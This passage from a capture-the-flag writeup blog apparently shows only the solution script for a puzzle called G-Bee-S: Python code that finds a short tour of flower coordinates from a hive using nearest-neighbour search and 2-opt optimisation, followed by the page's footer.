<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">coordinates = [</span><br><span class="line">    (<span class="number">0</span>, <span class="number">0</span>),  <span class="comment"># 起点</span></span><br><span class="line">    (-<span class="number">62</span>, -<span class="number">67</span>), (-<span class="number">8</span>, <span class="number">44</span>), (<span class="number">44</span>, <span class="number">17</span>), (-<span class="number">91</span>, -<span class="number">74</span>), (-<span class="number">56</span>, <span class="number">18</span>),</span><br><span class="line">    (<span class="number">96</span>, -<span class="number">19</span>), (<span class="number">45</span>, -<span class="number">67</span>), (-<span class="number">28</span>, <span class="number">62</span>), (<span class="number">94</span>, <span class="number">69</span>), (<span class="number">48</span>, <span class="number">52</span>),</span><br><span class="line">    (-<span class="number">11</span>, <span class="number">64</span>), (-<span class="number">95</span>, -<span class="number">57</span>), (-<span class="number">2</span>, <span class="number">79</span>), (<span class="number">34</span>, <span class="number">40</span>), (-<span class="number">5</span>, <span class="number">24</span>),</span><br><span class="line">    (-<span class="number">35</span>, -<span class="number">50</span>), (-<span class="number">40</span>, <span class="number">72</span>), (-<span class="number">25</span>, -<span class="number">4</span>), (-<span class="number">75</span>, -<span class="number">98</span>), (<span class="number">6</span>, <span class="number">98</span>),</span><br><span class="line">    (-<span class="number">87</span>, -<span class="number">37</span>), (-<span class="number">63</span>, <span class="number">99</span>), (-<span class="number">96</span>, <span class="number">86</span>), (<span class="number">28</span>, <span class="number">65</span>), (-<span class="number">87</span>, <span class="number">26</span>),</span><br><span class="line">    (<span class="number">53</span>, -<span class="number">2</span>), (-<span class="number">98</span>, <span class="number">7</span>), (<span class="number">69</span>, -<span class="number">71</span>), (<span class="number">18</span>, <span class="number">41</span>), (-<span class="number">84</span>, <span class="number">51</span>),</span><br><span class="line">    (-<span class="number">80</span>, -<span class="number">10</span>), (<span class="number">50</span>, <span class="number">39</span>), (<span class="number">13</span>, -<span class="number">89</span>), (<span class="number">4</span>, <span class="number">35</span>), (<span class="number">31</span>, <span class="number">95</span>),</span><br><span class="line">    (<span class="number">84</span>, -<span class="number">50</span>), (<span class="number">86</span>, -<span class="number">82</span>), (<span class="number">32</span>, -<span class="number">21</span>), (-<span class="number">36</span>, -<span class="number">22</span>), (<span class="number">34</span>, -<span class="number">77</span>),</span><br><span class="line">    (-<span class="number">77</span>, -<span class="number">78</span>), (-<span class="number">92</span>, -<span class="number">2</span>), (<span class="number">72</span>, -<span class="number">54</span>), (<span class="number">88</span>, -<span class="number">29</span>), (<span class="number">1</span>, -<span class="number">14</span>),</span><br><span class="line">    (-<span class="number">82</span>, <span class="number">97</span>), (-<span class="number">16</span>, -<span class="number">70</span>), (-<span class="number">19</span>, <span class="number">96</span>), (-<span class="number">41</span>, <span class="number">41</span>), (-<span class="number">24</span>, -<span class="number">87</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_distance</span>(<span class="params">p1, p2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算两点间欧氏距离&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> math.hypot(p1[<span class="number">0</span>]-p2[<span class="number">0</span>], p1[<span class="number">1</span>]-p2[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">total_distance</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算路径总长度&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(calculate_distance(coordinates[path[i]], coordinates[path[i+<span class="number">1</span>]])</span><br><span class="line">               <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path)-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nearest_neighbor</span>(<span class="params">start</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;最近邻贪心算法&quot;&quot;&quot;</span></span><br><span class="line">    unvisited = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(coordinates)))  <span class="comment"># 所有花朵索引</span></span><br><span class="line">    current = start</span><br><span class="line">    path = [current]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> unvisited:</span><br><span class="line">        <span class="comment"># 找到最近未访问点</span></span><br><span class="line">        nearest = <span class="built_in">min</span>(unvisited, key=<span class="keyword">lambda</span> x: calculate_distance(coordinates[current], coordinates[x]))</span><br><span class="line">        path.append(nearest)</span><br><span class="line">        unvisited.remove(nearest)</span><br><span class="line">        current = nearest</span><br><span class="line">    path.append(<span class="number">0</span>)  <span class="comment"># 返回蜂巢</span></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">two_opt_swap</span>(<span class="params">path, i, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;2-opt局部优化&quot;&quot;&quot;</span></span><br><span class="line">    new_path = path[:i] + path[i:k+<span class="number">1</span>][::-<span class="number">1</span>] + path[k+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> new_path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimize_path</span>(<span class="params">path, max_iterations=<span class="number">1000</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;用2-opt优化路径&quot;&quot;&quot;</span></span><br><span class="line">    improvement = <span class="literal">True</span></span><br><span class="line">    best_path = path.copy()</span><br><span class="line">    best_distance = total_distance(best_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(max_iterations):</span><br><span class="line">        improvement = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(best_path)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(best_path)-<span class="number">1</span>):</span><br><span class="line">                new_path = two_opt_swap(best_path, i, k)</span><br><span class="line">                new_distance = total_distance(new_path)</span><br><span class="line">                <span class="keyword">if</span> new_distance &lt; best_distance:</span><br><span class="line">                    best_path = new_path</span><br><span class="line">                    best_distance = new_distance</span><br><span class="line">                    improvement = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> improvement:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> best_path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成初始路径（从蜂巢出发）</span></span><br><span class="line">initial_path = nearest_neighbor(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化路径</span></span><br><span class="line">optimized_path = optimize_path(initial_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证路径包含所有花朵</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>(optimized_path)) == <span class="built_in">len</span>(coordinates), <span class="string">&quot;Missing some flowers!&quot;</span></span><br><span class="line"><span class="keyword">assert</span> optimized_path[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> optimized_path[-<span class="number">1</span>] == <span class="number">0</span>, <span class="string">&quot;Path must start/end at hive&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算总距离</span></span><br><span class="line">total_dist = total_distance(optimized_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Total distance: <span class="subst">&#123;total_dist:<span class="number">.2</span>f&#125;</span> (must be &lt; 1400)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Path order (0-based indices):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, optimized_path)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N0PSctf-2025-writeup"><span class="toc-number">1.</span> <span class="toc-text">N0PSctf 2025 writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwntopiashl"><span class="toc-number">2.</span> <span class="toc-text">pwntopiashl</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwntopiashl-1"><span class="toc-number">3.</span> <span class="toc-text">pwntopiashl</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Break-My-Stream"><span class="toc-number">4.</span> <span class="toc-text">Break My Stream</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#G-Bee-S"><span class="toc-number">5.</span> <span class="toc-text">G-Bee-S</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://syscall.fun/post/n0pstf-2025-z1pfrul.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&text=N0PSctf 2025 writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&is_video=false&description=N0PSctf 2025 writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=N0PSctf 2025 writeup&body=Check out this article: https://syscall.fun/post/n0pstf-2025-z1pfrul.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&name=N0PSctf 2025 writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&t=N0PSctf 2025 writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    scriptk1d
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
